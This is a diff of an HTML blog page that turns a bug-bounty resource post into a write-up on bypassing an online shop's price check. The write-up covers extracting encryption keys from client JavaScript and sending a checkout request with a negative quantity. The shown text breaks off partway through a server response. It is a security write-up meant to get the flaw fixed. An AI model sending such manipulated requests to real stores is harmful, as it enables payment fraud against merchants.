@@ -9,26 +9,24 @@
     <meta name=author content="Naveen J">
 
     <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Bug Bounty Arsenal | Naveen J</title>
+<title>Exploiting Business Logic Error: Price Manipulation | Naveen J</title>
 <meta name="generator" content="Jekyll v3.9.2" />
-<meta property="og:title" content="Bug Bounty Arsenal" />
-<meta name="author" content="naveen" />
+<meta property="og:title" content="Exploiting Business Logic Error: Price Manipulation" />
+<meta name="author" content="Naveen" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="The Repository contains various payloads, tools, tips and tricks from various hackers around the world." />
-<meta property="og:description" content="The Repository contains various payloads, tools, tips and tricks from various hackers around the world." />
-<link rel="canonical" href="http://localhost:4000/Bug-Bounty-Arsenal/" />
-<meta property="og:url" content="http://localhost:4000/Bug-Bounty-Arsenal/" />
+<meta name="description" content="This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company." />
+<meta property="og:description" content="This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company." />
+<link rel="canonical" href="http://localhost:4000/Business_logic_error/" />
+<meta property="og:url" content="http://localhost:4000/Business_logic_error/" />
 <meta property="og:site_name" content="Naveen J" />
-<meta property="og:image" content="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-03-19T22:10:00+05:30" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif" />
-<meta property="twitter:title" content="Bug Bounty Arsenal" />
+<meta property="article:published_time" content="2023-04-12T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exploiting Business Logic Error: Price Manipulation" />
 <meta name="twitter:site" content="@" />
-<meta name="twitter:creator" content="@naveen" />
+<meta name="twitter:creator" content="@Naveen" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"naveen"},"dateModified":"2021-03-19T22:10:00+05:30","datePublished":"2021-03-19T22:10:00+05:30","description":"The Repository contains various payloads, tools, tips and tricks from various hackers around the world.","headline":"Bug Bounty Arsenal","image":"https://github.com/thevillagehacker/thevillagehacker/raw/master/Do%20Hacks%20to%20Secure.gif","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Bug-Bounty-Arsenal/"},"url":"http://localhost:4000/Bug-Bounty-Arsenal/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-04-12T12:00:00+05:30","datePublished":"2023-04-12T12:00:00+05:30","description":"This blog discusses the exploitation of a business logic error that allows users to manipulate prices and pay less for the products and services offered by the target company.","headline":"Exploiting Business Logic Error: Price Manipulation","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Business_logic_error/"},"url":"http://localhost:4000/Business_logic_error/"}</script>
 <!-- End Jekyll SEO tag -->
 
 
@@ -54,7 +52,7 @@
 <meta name="msapplication-square310x310logo" content="mstile-310x310.png" />
 
 
-    <link rel="canonical" href="http://localhost:4000/Bug-Bounty-Arsenal/">
+    <link rel="canonical" href="http://localhost:4000/Business_logic_error/">
     <link rel="alternate" type="application/rss+xml" title="Naveen J" href="http://localhost:4000/feed.xml" />
 
     <script src="https://kit.fontawesome.com/d9b09040a7.js" crossorigin="anonymous"></script>
@@ -199,17 +197,17 @@ template { display: none; }
 .highlight .kp { font-weight: bold; }
 .highlight .kr { font-weight: bold; }
 .highlight .kt { color: #445588; font-weight: bold; }
-.highlight .m { color: #32f9f9; }
-.highlight .s { color: #dd1144; }
+.highlight .m { color: #2725ff; }
+.highlight .s { color: dd1144; }
 .highlight .n { color: #333333; }
-.highlight .na { color: #32f9f9; }
+.highlight .na { color: #395aef; }
 .highlight .nb { color: #0086b3; }
 .highlight .nc { color: #445588; font-weight: bold; }
 .highlight .no { color: teal; }
 .highlight .ni { color: purple; }
 .highlight .ne { color: #990000; font-weight: bold; }
-.highlight .nf { color: #ed4646; font-weight: bold; }
-.highlight .nn { color: #ffffff; }
+.highlight .nf { color: #c44dff; font-weight: bold; }
+.highlight .nn { color: #f1771ddb; }
 .highlight .nt { color: navy; }
 .highlight .nv { color: teal; }
 .highlight .ow { font-weight: bold; }
@@ -238,11 +236,11 @@ template { display: none; }
 
 body, html { font-size: 62.5%; }
 
-body { font: 14px Monaco, "Bitstream Vera Sans Mono", "Lucida Console", Terminal, monospace; color: #2c2626; background: #fff; text-align: justify; }
+body { font: 18px "Helvetica Neue", Helvetica, Arial, sans-serif; color: #2c2626; background: #fff; text-align: left; line-height: 1.75; font-size: 1.8rem; }
 
-h1, h2, h3, h4 { font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida Console", Terminal, monospace; color: #3697e6; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+h1, h2, h3, h4 { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; color: #000000; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
 
-h1 { font-size: 3rem; letter-spacing: -1px; color: #3697e6; font-weight: 700; }
+h1 { font-size: 3rem; letter-spacing: 0px; color: #000000; font-weight: 700; }
 
 h2 { font-size: 2.2rem; }
 
@@ -250,14 +248,14 @@ h3 { font-size: 2rem; }
 
 h4 { font-size: 1.6rem; }
 
-a { color: #3697e6; text-decoration: underline; font-weight: 300; }
+a { color: #253cc3; text-decoration: underline; font-weight: 300; }
 
 p { line-height: 1.7; color: #2c2626; font-weight: 300; margin-bottom: 20px; letter-spacing: 0.4px; }
 @media only screen and (max-width: 400px) { p { letter-spacing: 0.2px; } }
 
-strong { font-weight: 400; color: #000; }
+strong { font-weight: 400; color: #253cc3; }
 
-ul li, ol li { line-height: 2.4rem; font-weight: 300; color: #2c2626; }
+ul li, ol li { line-height: 3rem; font-weight: 300; color: #2c2626; }
 
 img, pre, iframe { max-width: 100%; }
 
@@ -272,11 +270,11 @@ hr { border: none; height: 1px; margin: 40px auto; background: #eee; width: 100%
 
 figure.highlight { width: 100%; margin: 0; }
 
-code { padding: 2px 3px; font-family: "Cascadia Code", Liberation Mono, monospace; font-size: 13px; vertical-align: middle; background: #03030a; border-radius: 2px; color: #fff; }
+code { padding: 2px 3px; font-family: "Cascadia Code PL", monospace; font-size: 15px; vertical-align: middle; background: #03030a; border-radius: 2px; color: #fff; }
 
-pre > code, tt { padding: 1px 0; font-family: "Cascadia Code", Liberation Mono, monospace; font-size: 13px; line-height: 20px; background: #03030a; border-radius: 2px; color: #fff; }
+pre > code, tt { padding: 1px 0; font-family: "Cascadia Code PL", monospace; font-size: 1.5rem; line-height: 1.6rem; border-radius: 2px; background: #f9f9f9; color: #000; }
 
-pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10px; font-family: "Cascadia Code", Liberation Mono, monospace; font-size: 1.2rem; line-height: 2rem; overflow: auto; background: #03030a; border: 1px solid #ededed; border-radius: 2px; color: #fff; }
+pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10px; font-family: "Cascadia Code PL", monospace; font-size: 1.2rem; line-height: 2rem; overflow: auto; background: #f9f9f9; border: 1px solid #ededed; border-radius: 2px; color: #fff; }
 
 .wrapper-normal, .wrapper-large { height: 100%; width: 96%; margin: 0 auto; }
 @media only screen and (max-width: 400px) { .wrapper-normal, .wrapper-large { width: 88%; } }
@@ -298,19 +296,19 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 
 @keyframes fade-in-down { 0% { opacity: 0; transform: translateY(-10px); }
   100% { opacity: 1; transform: translateY(0); } }
-.home, .blog, .projects { margin-top: 125px; }
-.home > .list, .blog > .list, .projects > .list { border-top: 1px solid #ededed; margin-top: 30px; padding-top: 40px; position: relative; }
-.home > .list:before, .blog > .list:before, .projects > .list:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #fff; box-shadow: #fff 0 0 0 5px; border-radius: 3px; }
+.home, .blog, .writeups { margin-top: 125px; }
+.home > .list, .blog > .list, .writeups > .list { border-top: 1px solid #ededed; margin-top: 30px; padding-top: 40px; position: relative; }
+.home > .list:before, .blog > .list:before, .writeups > .list:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #fff; box-shadow: #fff 0 0 0 5px; border-radius: 3px; }
 
-.home > .list > .item, .blog > .list > .item, .projects > .list > .item { display: block; width: 95%; margin: 0 auto; }
-.home > .list > .item > .url, .blog > .list > .item > .url, .projects > .list > .item > .url { width: 100%; display: block; padding: 20px 0; text-decoration: none; }
-.home > .list > .item > .url > .title, .blog > .list > .item > .url > .title, .projects > .list > .item > .url > .title { margin: 0; width: 75%; font-weight: 500; transition: all ease-in-out 0.2s; }
-.home > .list > .item:hover > .url > .title, .blog > .list > .item:hover > .url > .title, .projects > .list > .item:hover > .url > .title { color: #3697e6; }
-.home > .list aside, .blog > .list aside, .projects > .list aside { position: relative; top: 2px; margin: 0; width: 25%; float: right; font-weight: 300; color: #aaa; text-align: right; transition: all ease-in-out 0.2s; }
-.home > .list .item:hover .url aside, .blog > .list .item:hover .url aside, .projects > .list .item:hover .url aside { color: #2c2626; }
+.home > .list > .item, .blog > .list > .item, .writeups > .list > .item { display: block; width: 95%; margin: 0 auto; }
+.home > .list > .item > .url, .blog > .list > .item > .url, .writeups > .list > .item > .url { width: 100%; display: block; padding: 20px 0; text-decoration: none; }
+.home > .list > .item > .url > .title, .blog > .list > .item > .url > .title, .writeups > .list > .item > .url > .title { margin: 0; width: 75%; font-weight: 500; transition: all ease-in-out 0.2s; }
+.home > .list > .item:hover > .url > .title, .blog > .list > .item:hover > .url > .title, .writeups > .list > .item:hover > .url > .title { color: #253cc3; }
+.home > .list aside, .blog > .list aside, .writeups > .list aside { position: relative; top: 2px; margin: 0; width: 25%; float: right; font-weight: 300; color: #aaa; text-align: right; transition: all ease-in-out 0.2s; }
+.home > .list .item:hover .url aside, .blog > .list .item:hover .url aside, .writeups > .list .item:hover .url aside { color: #2c2626; }
 
-.blog > .list > .item > .url > .title, .projects > .list > .item > .url > .title { display: inline; }
-.blog > .list > .item > .url > .emoji, .projects > .list > .item > .url > .emoji { display: inline; position: relative; top: -4px; margin-right: 10px; }
+.blog > .list > .item > .url > .title, .writeups > .list > .item > .url > .title { display: inline; }
+.blog > .list > .item > .url > .emoji, .writeups > .list > .item > .url > .emoji { display: inline; position: relative; top: -4px; margin-right: 10px; }
 
 .page { margin-top: 125px; }
 .page > h1 { text-align: center; margin-bottom: 6rem; }
@@ -319,13 +317,13 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 
 .post { margin-top: 125px; }
 .post > .title { text-align: center; margin-bottom: 3rem; }
-.post > .date, .post > .post-tags { color: #aaa; font-weight: 300; font-size: 1.4rem; text-transform: uppercase; text-align: center; display: block; margin-bottom: 6rem; letter-spacing: 1px; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
+.post > .date, .post > .post-tags { color: #253cc3; font-size: 18px; text-transform: uppercase; text-align: center; display: block; margin-bottom: 6rem; letter-spacing: 1px; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; }
 .post > .date { margin-bottom: 2rem; }
-.post > .post-tags > .item { padding: 2px 8px; border-radius: 3px; font-size: 1.1rem; background: #ededed; color: #2c2626; letter-spacing: 1px; margin: 3px 1px; text-decoration: none; display: inline-block; }
+.post > .post-tags > .item { padding: 2px 8px; border-radius: 3px; font-size: 1.4rem; background: #ededed; color: #2c2626; letter-spacing: 1px; margin: 3px 1px; text-decoration: none; display: inline-block; }
 .post > h2, .post > h3, .post > h4 { margin-top: 40px; }
 .post > h2 a, .post > h3 a, .post > h4 a { text-decoration: none; }
 .post > .title-image { max-height: 120px; display: block; margin: 0 auto; }
-.post > .blog-navigation { font-size: 1.4rem; display: block; width: auto; overflow: hidden; }
+.post > .blog-navigation { font-size: 1.6rem; display: block; width: auto; overflow: hidden; }
 .post > .blog-navigation a { display: block; width: 50%; float: left; margin: 1em 0; }
 .post > .blog-navigation .next { text-align: right; }
 
@@ -333,23 +331,23 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 .tags > .list { border-top: 1px solid #ededed; margin-top: 30px; padding-top: 40px; position: relative; }
 .tags > .list:before { display: block; content: " "; width: 7px; height: 7px; border: #ededed 1px solid; position: absolute; top: -5px; left: 50%; margin-left: -5px; background: #fff; box-shadow: #fff 0 0 0 5px; border-radius: 3px; }
 
-.tags > .list > .item { font-weight: 300; text-transform: uppercase; text-align: center; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; padding: 3px 9px; border-radius: 3px; font-size: 1.3rem; background: #ededed; color: #2c2626; letter-spacing: 1px; margin: 0 0.5rem 1rem; text-decoration: none; display: inline-block; }
+.tags > .list > .item { font-weight: 300; text-transform: uppercase; text-align: center; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; padding: 3px 9px; border-radius: 3px; font-size: 1.4rem; background: #ededed; color: #2c2626; letter-spacing: 1px; margin: 0 0.5rem 1rem; text-decoration: none; display: inline-block; }
 
 .tag-list > .list { padding: 0; }
 .tag-list > .list > .item { display: block; width: 80%; margin: 0 10%; }
 .tag-list > .list > .item > .url { width: 100%; height: 100%; display: block; padding: 20px 0; text-decoration: none; }
 .tag-list > .list > .item > .url > .title { margin: 0; width: 75%; font-weight: 400; transition: all ease-in-out 0.2s; font-size: 1.6rem; }
-.tag-list > .list > .item:hover > .url > .title { color: #3697e6; }
+.tag-list > .list > .item:hover > .url > .title { color: #253cc3; }
 .tag-list > .list aside { position: relative; top: 2px; margin: 0; width: 25%; float: right; font-weight: 300; color: #aaa; text-align: right; transition: all ease-in-out 0.2s; font-size: 1.6rem; }
 .tag-list > .list .item:hover .url aside { color: #2c2626; }
 
 .author { padding: 3rem 0; border-bottom: 1px solid #ededed; border-top: 1px solid #ededed; max-width: 100%; margin: 4rem auto 0; }
 .author > .toleft > .selfie { width: 90%; border-radius: 100%; }
 .author > .toright > .name, .author > .toright > .bio { width: 60%; display: inline-block; }
-.author > .toright > .name { font-size: 1.5rem; font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida Console", Terminal, monospace; font-weight: 500; margin: 6px 0 0; }
+.author > .toright > .name { font-size: 1.5rem; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 500; margin: 6px 0 0; }
 @media only screen and (max-width: 400px) { .author > .toright > .name { width: 100%; display: block; } }
 @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toright > .name { width: 100%; display: block; } }
-.author > .toright > .bio { font-family: Monaco, "Bitstream Vera Sans Mono", "Lucida Console", Terminal, monospace; font-weight: 300; color: #aaa; font-size: 1.3rem; text-align: justify; line-height: 1.5; margin: 0; }
+.author > .toright > .bio { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-weight: 300; color: #aaa; font-size: 1.3rem; text-align: justify; line-height: 1.5; margin: 0; }
 @media only screen and (max-width: 400px) { .author > .toright > .bio { width: 100%; display: block; } }
 @media only screen and (min-width: 400px) and (max-width: 1050px) { .author > .toright > .bio { width: 100%; display: block; } }
 .author > .toleft { width: 10%; display: inline-block; }
@@ -368,7 +366,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 .footer-main > .copyright { padding-left: 10px; }
 .footer-main > .link { display: inline; vertical-align: middle; }
 .footer-main > .link > .icon { width: 15px !important; fill: #aaa !important; transition: ease-in-out all 0.3s; position: relative; display: inherit; top: -2px; margin: 0; left: 2px; }
-.footer-main > .link > .icon:hover { fill: #3697e6 !important; }
+.footer-main > .link > .icon:hover { fill: #253cc3 !important; }
 .footer-main > .extra { color: #aaa; margin-top: 0; font-weight: 300; }
 .footer-main > .extra > .link { color: #222; text-decoration: none; border-bottom: 1px solid transparent; transition: ease-in-out all 0.3s; padding-bottom: 1px; font-weight: 300; }
 .footer-main > .extra > .link:hover { border-color: #aaa; }
@@ -377,16 +375,16 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 .header-home > .link > .selfie { width: 125px; height: 125px; margin-bottom: 25px; border-radius: 100%; transition: all 0.2s; opacity: 1; }
 .header-home > .link > .selfie:hover { box-shadow: 0 0px 4px 0 rgba(0, 0, 0, 0.18), 0 0px 12px 0 rgba(0, 0, 0, 0.15); opacity: 0.8; }
 .header-home > .title { font-size: 4rem; margin: 0 0 13px; }
-.header-home > .description { font-size: 1.85rem; font-weight: 300; font-style: normal; color: #aaa; width: 70%; margin: 0 auto 30px; }
+.header-home > .description { font-size: 1.85rem; font-weight: 300; font-style: normal; color: #474646; width: 100%; margin: 0 auto 30px; }
 .header-home > .description a { font-weight: 200; }
 
 .nav > .list, .nav-home > .list { list-style: none; margin: 0; padding: 0 13px 0; }
 .nav > .list > .item, .nav-home > .list > .item { display: inline-block; }
-.nav > .list > .item > .link, .nav-home > .list > .item > .link { display: inline-block; font-weight: 300; font-size: 1.4rem; padding: 20px 10px; text-decoration: none; }
+.nav > .list > .item > .link, .nav-home > .list > .item > .link { display: inline-block; font-weight: 300; font-size: 1.8rem; padding: 20px 10px; text-decoration: none; }
 
 .nav { position: absolute; right: 0; top: 0; }
 .nav > .list { padding: 0 13px 0; }
-.nav > .list > .item > .link { font-size: 1.4rem; padding: 20px 10px; }
+.nav > .list > .item > .link { font-size: 1.8rem; padding: 20px 10px; }
 
 .nav-home { margin-top: 40px; text-align: center; }
 .nav-home > .list { padding: 0; }
@@ -443,7 +441,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 @media only screen and (max-width: 780px) { .side-by-side > .toleft > p, .side-by-side > .toright > p { margin: 0; } }
 
 .social-links > .link { margin: 0; text-decoration: none; position: relative; display: inline-block; height: 35px; width: 35px; color: #000; }
-.social-links > .link:hover > svg { color: #3697e6; }
+.social-links > .link:hover > svg { color: #253cc3; }
 .social-links > svg { transition: all ease-in-out 0.2s; }
 
 .spoiler { position: relative; }
@@ -482,7 +480,7 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
         
             
                 <li class="item">
-                    <a class="link" href="http://localhost:4000/projects">Projects</a>
+                    <a class="link" href="http://localhost:4000/writeups">Writeups</a>
                 </li>
             
         
@@ -503,15 +501,15 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 
 
 
-<h1 class="title">Bug Bounty Arsenal</h1>
+<h1 class="title">Exploiting Business Logic Error: Price Manipulation</h1>
 
 <span class="date">
-    <time datetime="19-03-2021">Friday. March 19, 2021</time>
+    <time datetime="12-04-2023">Wednesday. April 12, 2023</time>
      - <span class="reading-time" title="Estimated read time">
     
 
     
-        1 min
+        4 mins
     
 </span>
 
@@ -520,35 +518,165 @@ pre { box-sizing: border-box; margin: 0 0 1.75em 0; width: 100%; padding: 5px 10
 
     <div class="post-tags">
         
-            <a class="item" href="http://localhost:4000/tags/#bug-bounty">Bug Bounty</a>
+            <a class="item" href="http://localhost:4000/tags/#business-logic-error">Business Logic Error</a>
         
-            <a class="item" href="http://localhost:4000/tags/#hacking-tips">Hacking tips</a>
+            <a class="item" href="http://localhost:4000/tags/#misconfiguration">Misconfiguration</a>
         
-            <a class="item" href="http://localhost:4000/tags/#bypasss-paloads">Bypasss Paloads</a>
-        
-            <a class="item" href="http://localhost:4000/tags/#bypass-tricks">Bypass tricks</a>
-        
-            <a class="item" href="http://localhost:4000/tags/#reverse-shell">reverse shell</a>
-        
-            <a class="item" href="http://localhost:4000/tags/#h1-spotlights">H1 spotlights</a>
-        
-            <a class="item" href="http://localhost:4000/tags/#bug-bounty-writeups">Bug bounty writeups</a>
+            <a class="item" href="http://localhost:4000/tags/#price-manipulation">Price Manipulation</a>
         
     </div>
 
 
-<h2 id="bug-bounty-arsenal"><a href="https://github.com/thevillagehacker/Bug-Hunting-Arsenal">Bug Bounty Arsenal</a></h2>
+<div style="text-align: justify;">
 
-<h2 id="bug--bounty-hunting-and-penetration-testing-resources">Bug 🐞 Bounty Hunting and Penetration Testing Resources</h2>
-<p>The Repository contains various payloads, tools, tips, Books and tricks from various hackers around the world.</p>
+<h1 id="target-background">Target Background</h1>
+<p>The target of this analysis is a web application functioning as an e-commerce platform. It facilitates online purchases of various products and services by users.</p>
 
-<p><img src="https://img.shields.io/badge/Made%20with-Markdown-1f425f.svg" alt="made-with-Markdown" />
-<a href="https://github.com/thevillagehacker/Bug-Hunting/network"><img src="https://img.shields.io/github/forks/thevillagehacker/Bug-Hunting" alt="GitHub forks" /></a>
-<a href="https://github.com/thevillagehacker/"><img src="https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github" alt="Open Source? Yes!" /></a>
-<a href="https://github.com/thevillagehacker"><img src="https://img.shields.io/badge/say-thanks-ff69b4.svg" alt="saythanks" /></a>
-<a href="https://github.com/thevillagehacker/Bug-Hunting"><img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat" alt="contributions welcome" /></a></p>
+<h2 id="overview">Overview</h2>
+<p>The Target company previously disclosed a vulnerability report regarding a specific issue: “hackers were able to manipulate the payment amount during the checkout/order process.” To understand the application’s fix for this vulnerability, I attempted the same steps to examine the implemented validation mechanisms.</p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+<ul>
+  <li>Hosted on AWS</li>
+  <li>Utilizes React for web application development</li>
+  <li>Mobile application version is also available</li>
+  <li>All application requests and responses are encrypted</li>
+</ul>
+
+<h2 id="finding-the-encryption-key">Finding the Encryption Key</h2>
+<p>Upon inspecting the application traffic, I discovered that the JSON payloads in requests and responses were encrypted. To manipulate or interact with these encrypted payloads, I needed to locate the encryption and decryption keys.</p>
+
+<p>During my analysis of the JavaScript files, I identified the encryption key, the encryption algorithm, the mode, and the initialization vector. Armed with this information, I used online encryption tools to encrypt the payloads.</p>
+
+<h2 id="playing-with-fire">Playing with fire🔥</h2>
+<p>I attempted to modify the price parameter in the request, but the application’s validation mechanism prevented any successful manipulation. The amount to be paid was validated against a salted hash that was associated with the purchase order.</p>
+
+<h3 id="actual-request-and-response">Actual Request and Response</h3>
+
+<h3 id="request">Request</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v1/checkout</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "10",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</code></pre></div></div>
+
+<h3 id="response">Response</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
+<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...; Path=/; HttpOnly </span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+
+<span class="p">{</span><span class="w">
+  </span><span class="nl">"saltedhash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hashcode"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"product_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"121212"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"price"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"quantity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"amount_to_be_paid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"100"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"address"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ABC city, ABC."</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"zipcode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"123456"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The above request represents a checkout request sent to the server to facilitate payment for a purchase order. To address the previously exploited price manipulation vulnerability, the developer implemented an additional parameter named <code class="language-plaintext highlighter-rouge">saltedhash</code>.</p>
+
+<h2 id="bypass">Bypass</h2>
+<p>During my exploration of the application flow and requests, I decided to conduct a deeper investigation of the <code class="language-plaintext highlighter-rouge">checkout</code> request. I noticed a parameter called <code class="language-plaintext highlighter-rouge">quantity</code>, which was responsible for creating orders based on the desired quantity specified by customers. I attempted to modify this value to a negative number.</p>
+
+<h3 id="manipulated-request">Manipulated Request</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/v1/checkout</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+
+{
+  "saltedhash": "hashcode",
+  "product_id": "121212",
+  "price": "10",
+  "quantity": "-5",
+  "address": "ABC city, ABC.",
+  "zipcode": "123456"
+}
+</code></pre></div></div>
+
+<p>Upon sending the request with a negative value for the <code class="language-plaintext highlighter-rouge">quantity</code> parameter, the server responded by adjusting the amount to be paid accordingly. The lack of validation on the <code class="language-plaintext highlighter-rouge">quantity</code> parameter allowed negative values to be accepted. As a result, the backend calculation for the amount to be paid was based on the per-quantity price and the number of quantities in the cart.</p>
+
+<h3 id="response-1">Response</h3>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
+<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...; Path=/; HttpOnly </span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+
+<span class="p">{</span><span class="w">
